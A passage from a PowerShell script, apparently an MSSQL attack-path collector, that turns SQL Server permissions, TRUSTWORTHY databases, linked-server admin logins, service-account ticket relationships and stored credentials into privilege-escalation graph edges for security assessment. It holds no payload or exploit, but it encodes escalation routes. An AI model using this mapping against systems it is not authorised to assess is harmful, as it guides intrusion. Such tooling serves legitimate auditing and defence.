                        }
                    }
                }
            }
        }

        # Process Database Principal Permissions
        Write-Host "Creating edges for database principals"
        foreach ($db in $serverInfo.Databases) {
            foreach ($principal in $db.DatabasePrincipals) {

                foreach ($perm in $principal.Permissions) {

                    # Ignore DENY permissions for now
                    if (($perm.State -eq "GRANT" -or $perm.State -eq "GRANT_WITH_GRANT_OPTION") -and $perm.Permission -in $DatabasePermissionsToMap) {
                        switch ($perm.Permission) {

                            "ALTER" {

                                # ALTER permission on the database itself grants effective permissions ALTER ANY APPLICATION ROLE and ALTER ANY ROLE
                                if ($perm.ClassDesc -eq "DATABASE") {

                                    # Create non-traversable ALTER edge to the database itself
                                    if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $db -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                        Add-Edge -Kind "MSSQL_Alter"
                                    }

                                    # ALTER on database grants effective ALTER ANY ROLE and ALTER ANY APPLICATION ROLE                                
                                    foreach ($targetPrincipal in $db.DatabasePrincipals) {
                                        if ($targetPrincipal.TypeDescription -in @("DATABASE_ROLE", "APPLICATION_ROLE") -and
                                            $targetPrincipal.ObjectIdentifier -ne $principal.ObjectIdentifier) {

                                            # Check if source principal is db_owner
                                            $isDbOwner = $false

                                            # If not the db_owner role itself, check if it's a member of db_owner
                                            foreach ($role in $principal.MemberOf) {
                                                $roleName = if ($role.PSObject.Properties.Name -contains "Name") { 
                                                    $role.Name 
                                                } else {
                                                    $objIdParts = $role.ObjectIdentifier -split '@'
                                                    if ($objIdParts.Count -gt 0) { $objIdParts[0] }
                                                }
                                                
                                                if ($roleName -eq "db_owner") {
                                                    $isDbOwner = $true
                                                    break
                                                }
                                            }

                                            # For DATABASE_ROLE: db_owner can alter any role, others can only alter user-defined roles
                                            if (($targetPrincipal.TypeDescription -eq "DATABASE_ROLE" -and 
                                                ($isDbOwner -or $targetPrincipal.IsFixedRole -ne "1") -and
                                                # Exclude public role - its membership cannot be changed
                                                $targetPrincipal.Name -ne "public")) {
                                            
                                                if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $targetPrincipal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                                        Add-Edge -Kind "MSSQL_AddMember"
                                                }
                                            }

                                            # For APPLICATION_ROLE: any principal with ALTER DATABASE can change password
                                            elseif ($targetPrincipal.TypeDescription -eq "APPLICATION_ROLE") {
                                                if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $targetPrincipal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {                      
                                                        Add-Edge -Kind "MSSQL_ChangePassword"
                                                }
                                            }
                                        }
                                    }
                                }
                                
                                elseif ($perm.PSObject.Properties.Name -contains "TargetObjectIdentifier" -and $perm.TargetObjectIdentifier) {

                                    if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
            
                                        # Create the non-traversable MSSQL_Alter edge
                                        Add-Edge -Kind "MSSQL_Alter"

                                        # Handle specific target types
                                        # Not possible to grant a principal ALTER on fixed roles, so we don't need to check for fixed/user-defined
                                        switch ($script:CurrentEdgeContext.targetPrincipal.TypeDescription) {
                                            "DATABASE_ROLE" {
                                                Add-Edge -Kind "MSSQL_Alter"
                                                Add-Edge -Kind "MSSQL_AddMember"
                                            }
                                            "APPLICATION_ROLE" {
                                                # ALTER permission on an application role does not allow the password to be changed
                                            }
                                            "SQL_USER" {
                                                # ALTER permission on a database user does not allow the associated login's password to be changed
                                            }
                                        }           
                                    }
                                }
                            }

                            "ALTER ANY APPLICATION ROLE" {
                                # Set context to the database
                                if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $db -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                    # Create edge to the database since this permission affects ANY application role
                                    Add-Edge -Kind "MSSQL_AlterAnyAppRole"
                                }
                                # Create edges to each individual application role
                                foreach ($targetPrincipal in $db.DatabasePrincipals) {
                                    if ($targetPrincipal.TypeDescription -eq "APPLICATION_ROLE" -and
                                        $targetPrincipal.ObjectIdentifier -ne $principal.ObjectIdentifier) {
                                        
                                        # Set context to the application role
                                        if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $targetPrincipal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                            Add-Edge -Kind "MSSQL_ChangePassword"
                                        }
                                    }
                                }
                            }           
                            
                            "ALTER ANY ROLE" {

                                # Create edge to the database since this permission affects ANY role
                                if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $db -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                    Add-Edge -Kind "MSSQL_AlterAnyDBRole"
                                }
                                
                                # Create edges to each eligible database role
                                foreach ($targetPrincipal in $db.DatabasePrincipals) {
                                    if ($targetPrincipal.TypeDescription -eq "DATABASE_ROLE" -and
                                        $targetPrincipal.ObjectIdentifier -ne $principal.ObjectIdentifier -and
                                        # Exclude public role - its membership cannot be changed
                                        $targetPrincipal.Name -ne "public") {
                                        
                                        # Check if source principal is db_owner
                                        $isDbOwner = $false

                                        # If not the db_owner role itself, check if it's a member of db_owner
                                        foreach ($role in $principal.MemberOf) {
                                            $roleName = if ($role.PSObject.Properties.Name -contains "Name") { 
                                                $role.Name 
                                            } else {
                                                $objIdParts = $role.ObjectIdentifier -split '@'
                                                if ($objIdParts.Count -gt 0) { $objIdParts[0] }
                                            }
                                            
                                            if ($roleName -eq "db_owner") {
                                                $isDbOwner = $true
                                                break
                                            }
                                        }         
                                    

                                        # db_owner can alter any role
                                        # All other roles can only alter user-defined roles
                                        if ($isDbOwner -or $targetPrincipal.IsFixedRole -ne "1") {
                                            if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $targetPrincipal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                                Add-Edge -Kind "MSSQL_AddMember"                        
                                            }
                                        }
                                    }
                                }
                            }
                            
                            "ALTER ANY USER" {
                                # ALTER permission on a database user does not allow the associated login's password to be changed
                            }
                            
                            "CONNECT" {
                                # Connect permission cannot be assigned to application roles
                                if ($perm.ClassDesc -ne "APPLICATION_ROLE") {

                                    if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $db -Permission $perm -DatabaseName $db.Name) {
                                        Add-Edge -Kind "MSSQL_Connect" -Target $db.ObjectIdentifier
                                    }
                                }
                            }
                            
                            "CONTROL" {

                                # CONTROL permission on the database itself allows impersonation, role membership changes, and application role password changes
                                if ($perm.ClassDesc -eq "DATABASE") {

                                    if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $db -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                
                                        # Create the non-traversable MSSQL_Control edge
                                        Add-Edge -Kind "MSSQL_Control"
                                    
                                        # Create traversable MSSQL_ControlDB edge
                                        Add-Edge -Kind "MSSQL_ControlDB"
                                    }
                                }

                                elseif ($perm.PSObject.Properties.Name -contains "TargetObjectIdentifier" -and $perm.TargetObjectIdentifier) {
                                    # CONTROL on specific database objects
                                    if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                        
                                        # Create the non-traversable MSSQL_Control edge
                                        Add-Edge -Kind "MSSQL_Control"
                                        
                                        # Handle specific target types
                                        switch ($script:CurrentEdgeContext.targetPrincipal.TypeDescription) {
                                            { $_ -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER") } {
                                                # CONTROL on user = Impersonate
                                                Add-Edge -Kind "MSSQL_ExecuteAs"
                                            }
                                            "DATABASE_ROLE" {
                                                # CONTROL on role = Add members + Take ownership
                                                # It's not possible to set CONTROL permission on a fixed database role so we don't need to check
                                                Add-Edge -Kind "MSSQL_AddMember"
                                                Add-Edge -Kind "MSSQL_ChangeOwner"
                                            }
                                            "APPLICATION_ROLE" {
                                                # CONTROL permission on the application role does not allow the password to be changed - requires ALTER ANY APPLICATION ROLE or CONTROL on database
                                            }
                                        }
                                    }
                                }
                            }
                            
                            "IMPERSONATE" {
                                if ($perm.PSObject.Properties.Name -contains "TargetObjectIdentifier" -and $perm.TargetObjectIdentifier) {
                                    if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                        # Only create edge if target is a database user
                                        if ($script:CurrentEdgeContext.targetPrincipal.TypeDescription -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER")) {
                                            
                                            Add-Edge -Kind "MSSQL_Impersonate"
                                            Add-Edge -Kind "MSSQL_ExecuteAs"
                                        }
                                        # Note: IMPERSONATE permission cannot be granted on DATABASE_ROLE or APPLICATION_ROLE
                                    }
                                }
                            }
                            
                            "TAKE OWNERSHIP" {
                                if ($perm.ClassDesc -eq "DATABASE") {
                                    # TAKE OWNERSHIP on the database - can take ownership of any database role within the database but can't take ownership of the database itself

                                    # Create non-traversable edge to the database
                                    if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $db -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                        Add-Edge -Kind "MSSQL_TakeOwnership"
                                    }
                                    
                                    # Create edges to roles
                                    foreach ($targetRole in $db.DatabasePrincipals) {
                                        if ($targetRole.TypeDescription -eq "DATABASE_ROLE") {
                                            if (Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $targetRole -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {
                                                    Add-Edge -Kind "MSSQL_ChangeOwner"
                                            }
                                        }
                                    }
                                }
                                elseif ($perm.PSObject.Properties.Name -contains "TargetObjectIdentifier" -and $perm.TargetObjectIdentifier) {
                                    # TAKE OWNERSHIP on specific object
                                    if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -DatabaseName $db.Name -ServerInfo $serverInfo -DatabaseInfo $db) {

                                        # Create non-traversable MSSQL_TakeOwnership edge
                                        Add-Edge -Kind "MSSQL_TakeOwnership"
                                        
                                        # Handle specific target types
                                        if ($script:CurrentEdgeContext.targetPrincipal.TypeDescription -eq "DATABASE_ROLE") {
                                            Add-Edge -Kind "MSSQL_ChangeOwner"
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Write-Host "Creating miscellaneous edges"
        
        # MSSQL_IsTrustedBy and MSSQL_ExecuteAsOwner for TRUSTWORTHY databases
        foreach ($db in $serverInfo.Databases) {
            if ($db.TRUSTWORTHY -eq 1) {

                # Create MSSQL_IsTrustedBy edge for any TRUSTWORTHY database
                Set-EdgeContext -SourcePrincipal $db -TargetPrincipal $serverInfo
                Add-Edge -Source $db.ObjectIdentifier `
                        -Target $serverInfo.ObjectIdentifier `
                        -Kind "MSSQL_IsTrustedBy" 
                
                # Check if owner has high privileges for MSSQL_ExecuteAsOwner edges
                if ($db.OwnerPrincipalID) {
                    # Find the database owner in server principals
                    $dbOwner = $serverInfo.ServerPrincipals | Where-Object {
                        $_.PrincipalID -eq $db.OwnerPrincipalID
                    } | Select-Object -First 1
                
                    if ($dbOwner) {

                        # Check if owner has sysadmin, securityadmin, CONTROL SERVER, or IMPERSONATE ANY LOGIN, including via nested roles
                        $ownerHasControlServer = Get-EffectivePermissions -Principal $dbOwner -TargetPermission "CONTROL SERVER" -ServerInfo $serverInfo                    
                        $ownerHasImpersonateAnyLogin = Get-EffectivePermissions -Principal $dbOwner -TargetPermission "IMPERSONATE ANY LOGIN" -ServerInfo $serverInfo                    
                        $ownerHasSecurityadmin = Get-NestedRoleMembership -Principal $dbOwner -TargetRoleName "securityadmin" -ServerInfo $serverInfo
                        $ownerHasSysadmin = Get-NestedRoleMembership -Principal $dbOwner -TargetRoleName "sysadmin" -ServerInfo $serverInfo
                    
                        if ($ownerHasControlServer -or $ownerHasImpersonateAnyLogin -or $ownerHasSecurityadmin -or $ownerHasSysadmin) {
                            # Create MSSQL_ExecuteAsOwner edges from database principals to server
                            Set-EdgeContext -SourcePrincipal $db -TargetPrincipal $serverInfo

                            Add-Edge -Source $db.ObjectIdentifier `
                                    -Target $serverInfo.ObjectIdentifier `
                                    -Kind "MSSQL_ExecuteAsOwner" `
                                    -Properties @{
                                        database = $db.Name
                                        databaseIsTrustworthy = $db.TRUSTWORTHY
                                        ownerHasControlServer = $ownerHasControlServer
                                        ownerHasImpersonateAnyLogin = $ownerHasImpersonateAnyLogin
                                        ownerHasSecurityadmin = $ownerHasSecurityadmin
                                        ownerHasSysadmin = $ownerHasSysadmin
                                        ownerLoginName = $db.OwnerLoginName
                                        ownerObjectIdentifier = $db.OwnerObjectIdentifier
                                        ownerPrincipalID = $db.OwnerPrincipalID
                                        SQLServer = $serverInfo.ObjectIdentifier
                                    }
                        }
                    }
                }
            }
        }

        # Server-Database relationships
        foreach ($db in $serverInfo.Databases) {
            Set-EdgeContext -SourcePrincipal $serverInfo -TargetPrincipal $db
            Add-Edge -Source $serverInfo.ObjectIdentifier `
                    -Target $db.ObjectIdentifier `
                    -Kind "MSSQL_Contains" 
        }

        # Database ownership relationships
        foreach ($db in $serverInfo.Databases) {
            if ($db.OwnerObjectIdentifier) {

                # Find the owner principal
                $ownerPrincipal = $serverInfo.ServerPrincipals | Where-Object { $_.ObjectIdentifier -eq $db.OwnerObjectIdentifier } | Select-Object -First 1
                
                if ($OwnerPrincipal) {
                    Set-EdgeContext -SourcePrincipal $ownerPrincipal -TargetPrincipal $db
                    Add-Edge -Source $db.OwnerObjectIdentifier `
                    -Target $db.ObjectIdentifier `
                    -Kind "MSSQL_Owns" 
                }
            }
        }

        # Server role memberships
        foreach ($principal in $serverInfo.ServerPrincipals) {
            foreach ($role in $principal.MemberOf) {

                # Set target type for fixed roles without a TypeDescription
                Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $role -TargetType "MSSQL_ServerRole"
                Add-Edge -Source $principal.ObjectIdentifier `
                        -Target $role.ObjectIdentifier `
                        -Kind "MSSQL_MemberOf" 
            }
        }

        # Add MSSQL_GrantAnyPermission edge for securityadmin role
        foreach ($principal in $serverInfo.ServerPrincipals) {
            if ($principal.TypeDescription -eq "SERVER_ROLE" -and $principal.Name -eq "securityadmin") {
                
                Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $serverInfo
                Add-Edge -Source $principal.ObjectIdentifier `
                        -Target $serverInfo.ObjectIdentifier `
                        -Kind "MSSQL_GrantAnyPermission" 
                break  # Only one securityadmin role exists
            }
        }

        # Database role memberships
        foreach ($db in $serverInfo.Databases) {
            foreach ($principal in $db.DatabasePrincipals) {
                foreach ($role in $principal.MemberOf) {

                    # Set target type for fixed roles without a TypeDescription
                    Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $role -TargetType "MSSQL_DatabaseRole" -DatabaseName $db.Name
                    Add-Edge -Source $principal.ObjectIdentifier `
                            -Target $role.ObjectIdentifier `
                            -Kind "MSSQL_MemberOf" 
                }
            }
        }

        # Add MSSQL_GrantAnyDBPermission edge for db_securityadmin roles
        foreach ($db in $serverInfo.Databases) {
            foreach ($principal in $db.DatabasePrincipals) {
                if ($principal.TypeDescription -eq "DATABASE_ROLE" -and $principal.Name -eq "db_securityadmin") {

                    Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $db -DatabaseName $db.Name
                    Add-Edge -Source $principal.ObjectIdentifier `
                            -Target $db.ObjectIdentifier `
                            -Kind "MSSQL_GrantAnyDBPermission" 
                    break  # Only one db_securityadmin per database
                }
            }
        }

        # Login to Database User mappings
        foreach ($db in $serverInfo.Databases) {
            foreach ($principal in $db.DatabasePrincipals) {
                if ($principal.ServerLogin -and $principal.ServerLogin.ObjectIdentifier) {

                    # Specify source type for fixed roles with no TypeDescription
                    Set-EdgeContext -SourcePrincipal $principal.ServerLogin -SourceType "MSSQL_Login" -TargetPrincipal $principal -DatabaseName $db.Name
                    Add-Edge -Source $principal.ServerLogin.ObjectIdentifier `
                            -Target $principal.ObjectIdentifier `
                            -Kind "MSSQL_IsMappedTo" 
                }
            }
        }

        # Ownership relationships for server principals
        foreach ($principal in $serverInfo.ServerPrincipals) {
            if ($principal.OwningPrincipalID -and $principal.OwningPrincipalID -ne '' -and 
                $principal.OwningObjectIdentifier -and $principal.TypeDescription -eq "SERVER_ROLE") {
                
                # Only server roles have owners
                $ownerPrincipal = $serverInfo.ServerPrincipals | Where-Object { $_.PrincipalID -eq $principal.OwningPrincipalID } | Select-Object -First 1
                if ($ownerPrincipal) {

                    Set-EdgeContext -SourcePrincipal $ownerPrincipal -TargetPrincipal $principal   
                    Add-Edge -Source $principal.OwningObjectIdentifier `
                            -Target $principal.ObjectIdentifier `
                            -Kind "MSSQL_Owns"
                }
            }
        }

        # Database principal ownership
        foreach ($db in $serverInfo.Databases) {
            foreach ($principal in $db.DatabasePrincipals) {
                if ($principal.OwningPrincipalID -and $principal.OwningPrincipalID -ne '' -and 
                    $principal.OwningObjectIdentifier -and 
                    $principal.TypeDescription -eq "DATABASE_ROLE") {
                    
                    # Only database roles have owners
                    $ownerPrincipal = $db.DatabasePrincipals | Where-Object { $_.PrincipalID -eq $principal.OwningPrincipalID } | Select-Object -First 1
                    if ($ownerPrincipal) {

                        Set-EdgeContext -SourcePrincipal $ownerPrincipal -TargetPrincipal $principal -DatabaseName $db.Name
                        Add-Edge -Source $principal.OwningObjectIdentifier `
                                -Target $principal.ObjectIdentifier `
                                -Kind "MSSQL_Owns"
                    }
                }
            }
        }

        $computerId = (Resolve-DomainPrincipal $serverInfo.Hostname).SID

        # Computer-Server relationships
        Set-EdgeContext -SourcePrincipal @{ ObjectIdentifier = $computerId } -TargetPrincipal $serverInfo -SourceType "Computer" -TargetType "MSSQL_Server"
        Add-Edge -Source $computerId `
                -Target $serverInfo.ObjectIdentifier `
                -Kind "MSSQL_HostFor"

        Set-EdgeContext -SourcePrincipal $serverInfo -TargetPrincipal @{ ObjectIdentifier = $computerId } -SourceType "MSSQL_Server" -TargetType "Computer"
        Add-Edge -Source $serverInfo.ObjectIdentifier `
                -Target $computerId `
                -Kind "MSSQL_ExecuteOnHost" 

        # Service Account relationships
        foreach ($serviceAccount in $serverInfo.ServiceAccounts) {
            if ($serviceAccount.ObjectIdentifier) {

                # Service account edges
                Set-EdgeContext -SourcePrincipal $serviceAccount -TargetPrincipal $serverInfo -SourceType "Base" -TargetType "MSSQL_Server"
                Add-Edge -Source $serviceAccount.ObjectIdentifier `
                        -Target $serverInfo.ObjectIdentifier `
                        -Kind "MSSQL_ServiceAccountFor"

                # HasSession edge
                if (-not ($serviceAccount.Name -eq "$serverHostname$" -or 
                        $serviceAccount.Name -eq "NT AUTHORITY\SYSTEM" -or 
                        $serviceAccount.Name -eq "LocalSystem" -or 
                        $serviceAccount.Name -eq "NT AUTHORITY\LOCAL SERVICE" -or 
                        $serviceAccount.Name -eq "NT AUTHORITY\NETWORK SERVICE")) {                     
                    
                    Set-EdgeContext -SourcePrincipal @{ ObjectIdentifier = $computerId } -TargetPrincipal $serviceAccount -SourceType "Computer" -TargetType "Base"
                    Add-Edge -Source $computerId `
                            -Target $serviceAccount.ObjectIdentifier `
                            -Kind "HasSession"
                }

                # MSSQL_GetAdminTGS edge
                if ($serverInfo.IsAnyDomainPrincipalSysadmin) {

                    Set-EdgeContext -SourcePrincipal $serviceAccount -TargetPrincipal $serverInfo -SourceType "User" -TargetType "MSSQL_Server"
                    Add-Edge -Source $serviceAccount.ObjectIdentifier `
                            -Target $serverInfo.ObjectIdentifier `
                            -Kind "MSSQL_GetAdminTGS" `
                            -Properties @{
                                domainPrincipalsWithControlServer = $serverInfo.DomainPrincipalsWithControlServer
                                domainPrincipalsWithImpersonateAnyLogin = $serverInfo.DomainPrincipalsWithImpersonateAnyLogin
                                domainPrincipalsWithSecurityadmin = $serverInfo.DomainPrincipalsWithSecurityadmin
                                domainPrincipalsWithSysadmin = $serverInfo.DomainPrincipalsWithSysadmin
                            }
                }

                # MSSQL_GetTGS edges to domain logins
                foreach ($principal in $serverInfo.ServerPrincipals) {
                    if (($principal.TypeDescription -eq "WINDOWS_LOGIN" -or $principal.TypeDescription -eq "WINDOWS_GROUP") -and
                        $principal.IsActiveDirectoryPrincipal -eq "1") {

                        Set-EdgeContext -SourcePrincipal $serviceAccount -TargetPrincipal $principal -SourceType "User" -TargetType "MSSQL_Login"
                        Add-Edge -Source $serviceAccount.ObjectIdentifier `
                                -Target $principal.ObjectIdentifier `
                                -Kind "MSSQL_GetTGS"
                    }
                }
            }
        }

        # Linked Server edges
        Write-Host "Creating edges for linked servers"
        foreach ($linkedServer in $serverInfo.LinkedServers) {
            if ($linkedServer.DataSource) {
                # Determine the source server's ObjectIdentifier
                $sourceObjectId = if ($linkedServer.SourceServer.ToLower() -eq $serverInfo.Hostname.ToLower()) {
                    $serverInfo.ObjectIdentifier
                } else {
                    $sourceResolved = Resolve-DataSourceToSid -DataSource $linkedServer.SourceServer
                    if ($sourceResolved) { $sourceResolved } else { "LinkedServer:$($linkedServer.SourceServer)" }
                }

                Set-EdgeContext -SourcePrincipal $serverInfo -TargetPrincipal $linkedServer -SourceType "MSSQL_Server" -TargetType "MSSQL_Server"

                # MSSQL_LinkedTo edge
                Add-Edge -Source $sourceObjectId `
                        -Target $linkedServer.ResolvedObjectIdentifier `
                        -Kind "MSSQL_LinkedTo" `
                        -Properties @{
                            dataAccess = $linkedServer.DataAccess
                            dataSource = $linkedServer.DataSource
                            localLogin = $linkedServer.LocalLogin
                            path = $linkedServer.Path
                            product = $linkedServer.Product
                            provider = $linkedServer.Provider
                            remoteCurrentLogin = $linkedServer.RemoteCurrentLogin
                            remoteHasControlServer = $linkedServer.RemoteHasControlServer
                            remoteHasImpersonateAnyLogin = $linkedServer.RemoteHasImpersonateAnyLogin
                            remoteIsMixedMode = $linkedServer.RemoteIsMixedMode
                            remoteIsSecurityAdmin = $linkedServer.RemoteIsSecurityAdmin
                            remoteIsSysadmin = $linkedServer.RemoteIsSysadmin
                            remoteLogin = $linkedServer.RemoteLogin
                            rpcOut = $linkedServer.RPCOut
                            usesImpersonation = $linkedServer.UsesImpersonation
                        }
                
                # MSSQL_LinkedAsAdmin edge if conditions are met
                if ($linkedServer.RemoteLogin -and 
                    # Filter to SQL logins
                    -not ($linkedServer.RemoteLogin -match '\\') -and
                    # Filter to privileged logins
                    ($linkedServer.RemoteIsSysadmin -or 
                    $linkedServer.RemoteIsSecurityAdmin -or 
                    $linkedServer.RemoteHasControlServer -or 
                    $linkedServer.RemoteHasImpersonateAnyLogin) -and
                    # Mixed mode must be enabled
                    $linkedServer.RemoteIsMixedMode) {
                    
                    Add-Edge -Source $sourceObjectId `
                            -Target $linkedServer.ResolvedObjectIdentifier `
                            -Kind "MSSQL_LinkedAsAdmin" `
                            -Properties @{
                                dataAccess = $linkedServer.DataAccess
                                dataSource = $linkedServer.DataSource
                                localLogin = $linkedServer.LocalLogin
                                path = $linkedServer.Path
                                product = $linkedServer.Product
                                provider = $linkedServer.Provider
                                remoteCurrentLogin = $linkedServer.RemoteCurrentLogin
                                remoteHasControlServer = $linkedServer.RemoteHasControlServer
                                remoteHasImpersonateAnyLogin = $linkedServer.RemoteHasImpersonateAnyLogin
                                remoteIsMixedMode = $linkedServer.RemoteIsMixedMode
                                remoteIsSecurityAdmin = $linkedServer.RemoteIsSecurityAdmin
                                remoteIsSysadmin = $linkedServer.RemoteIsSysadmin
                                remoteLogin = $linkedServer.RemoteLogin
                                rpcOut = $linkedServer.RPCOut
                                usesImpersonation = $linkedServer.UsesImpersonation
                            }
                }
            }
        }

        # Credential edges
        Write-Host "Creating edges for domain principals"
        foreach ($principal in $serverInfo.ServerPrincipals) {
            if ($principal.PSObject.Properties.Name -contains "HasCredential" -and $principal.HasCredential) {
                $matchingCredential = $serverInfo.Credentials | Where-Object { 
                    $_.CredentialName -eq $principal.HasCredential.CredentialName 
                } | Select-Object -First 1
                
                if ($matchingCredential -and $matchingCredential.ResolvedSID) {

                    Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal @{ ObjectIdentifier = $matchingCredential.ResolvedSID } -TargetType "Base"
                    Add-Edge -Source $principal.ObjectIdentifier `
                            -Target $matchingCredential.ResolvedSID `
                            -Kind "MSSQL_HasMappedCred" `
                            -Properties @{
                                credentialId = $matchingCredential.CredentialId
                                credentialIdentity = $matchingCredential.CredentialIdentity
                                credentialName = $matchingCredential.CredentialName
                                createDate = $matchingCredential.CreateDate
                                modifyDate = $matchingCredential.ModifyDate
                                resolvedSid = $matchingCredential.ResolvedSID
                            }
                }
            }
        }

        # Proxy credential edges
        foreach ($proxy in $serverInfo.ProxyAccounts) {
            if ($proxy.IsDomainPrincipal -and $proxy.ResolvedSID -and $proxy.AuthorizedPrincipals) {
                $principals = $proxy.AuthorizedPrincipals -split ',' | ForEach-Object { $_.Trim() }
                
                foreach ($principalName in $principals) {
                    if ($principalName) {
                        $matchingPrincipal = $serverInfo.ServerPrincipals | Where-Object { 
                            $_.Name -eq $principalName 
                        } | Select-Object -First 1
                        
                        if ($matchingPrincipal) {
                            Set-EdgeContext -SourcePrincipal $matchingPrincipal -TargetPrincipal @{ ObjectIdentifier = $proxy.ResolvedSID } -TargetType "Base"
                            Add-Edge -Source $matchingPrincipal.ObjectIdentifier `
                                    -Target $proxy.ResolvedSID `
                                    -Kind "MSSQL_HasProxyCred" `
                                    -Properties @{
                                        authorizedPrincipals = $proxy.AuthorizedPrincipals
                                        credentialId = $proxy.CredentialId
                                        credentialIdentity = $proxy.CredentialIdentity
                                        credentialName = $proxy.CredentialName
                                        description = $proxy.Description
                                        isEnabled = $proxy.Enabled
                                        proxyId = $proxy.ProxyId
                                        proxyName = $proxy.ProxyName
                                        subsystems = $proxy.Subsystems
                                        resolvedSid = $proxy.ResolvedSID
                                        resolvedType = $proxy.ResolvedType
                                    }
                        }
                    }
                }
            }
        }

        # Database-scoped credential edges
        foreach ($db in $serverInfo.Databases) {
            if ($db.PSObject.Properties.Name -contains "DatabaseScopedCredentials") {
                foreach ($credential in $db.DatabaseScopedCredentials) {
                    if ($credential.IsDomainPrincipal -and $credential.ResolvedSID) {
 
                        Set-EdgeContext -SourcePrincipal $db -TargetPrincipal @{ ObjectIdentifier = $credential.ResolvedSID } -SourceType "MSSQL_Database" -TargetType "Base"                        
                        Add-Edge -Source $db.ObjectIdentifier `
                                -Target $credential.ResolvedSID `
                                -Kind "MSSQL_HasDBScopedCred" `
                                -Properties @{
                                    credentialId = $credential.CredentialId
                                    credentialIdentity = $credential.CredentialIdentity
                                    credentialName = $credential.CredentialName
                                    createDate = $credential.CreateDate
                                    database = $credential.Database
                                    modifyDate = $credential.ModifyDate
                                    resolvedSid = $credential.ResolvedSID
                                }
                    }
                }
            }
        }

        # Track principals that already have MSSQL_HasLogin edges
        $principalsWithLogin = New-Object System.Collections.Generic.HashSet[string]        

        # Local group edges first so computer name is prepended to SID
        if ($serverInfo.PSObject.Properties.Name -contains "LocalGroupsWithLogins") {
            foreach ($groupObjId in $serverInfo.LocalGroupsWithLogins.Keys) {
                $groupInfo = $serverInfo.LocalGroupsWithLogins[$groupObjId]
                $groupPrincipal = $groupInfo.Principal
                
                if ($groupPrincipal.SecurityIdentifier) {

                    # Don't track SIDs common to multiple machines like S-1-5-32-544
                    if (-not $groupPrincipal.SecurityIdentifier -like "S-1-5-32-*") {
                        # Track this principal as having a login
                        [void]$principalsWithLogin.Add($groupPrincipal.SecurityIdentifier)
                    }

                    $groupObjectId = "$serverFQDN-$($groupPrincipal.SecurityIdentifier)"
                    [void]$principalsWithLogin.Add($groupObjectId)

                    # Add node so we don't get Unknown kind
                    Add-Node -Id $groupObjectId `
                            -Kinds $("Group", "Base") `
                            -Properties @{
                                name = $groupPrincipal.Name.Split('\')[-1]
                            }

                    Set-EdgeContext -SourcePrincipal @{ ObjectIdentifier = $groupObjectId } -TargetPrincipal $groupPrincipal -SourceType "Group" -TargetType "MSSQL_Login"

                    # MSSQL_HasLogin edge from Group to ServerLogin
                    Add-Edge -Source $groupObjectId `
                            -Target $groupPrincipal.ObjectIdentifier `
                            -Kind "MSSQL_HasLogin"
                    
                    # Add edges for group members
                    Add-Edge -Source $member.SID `
                            -Target $groupObjectId `
                            -Kind "MemberOf"

                } else {
                    Write-Verbose "Skipping local group $($groupPrincipal.Name) because SID was not found"
                }
            }
        }        

        # Base to Login edges for domain accounts
        foreach ($principal in $serverInfo.ServerPrincipals) {
            if (($principal.TypeDescription -eq "WINDOWS_LOGIN" -or $principal.TypeDescription -eq "WINDOWS_GROUP") -and $principal.SecurityIdentifier) {
                
                $loginEnabled = $principal.IsDisabled -ne "1"
                $permissionToConnect = $false
                
                foreach ($perm in $principal.Permissions) {
                    if ($perm.Permission -eq "CONNECT SQL" -and $perm.State -eq "GRANT") {
                        $permissionToConnect = $true
                        break
                    }
                }
                
                if (-not $permissionToConnect -and $principal.MemberOf.Count -gt 0) {
                    foreach ($role in $principal.MemberOf) {
                        $roleName = $null
                        if ($role.PSObject.Properties.Name -contains "Name" -and $role.Name) {
                            $roleName = $role.Name
                        } elseif ($role.PSObject.Properties.Name -contains "ObjectIdentifier" -and $role.ObjectIdentifier) {
                            $objIdParts = $role.ObjectIdentifier -split '@'
                            if ($objIdParts.Count -gt 0 -and $objIdParts[0]) {
                                $roleName = $objIdParts[0]
                            }
                        }
                        
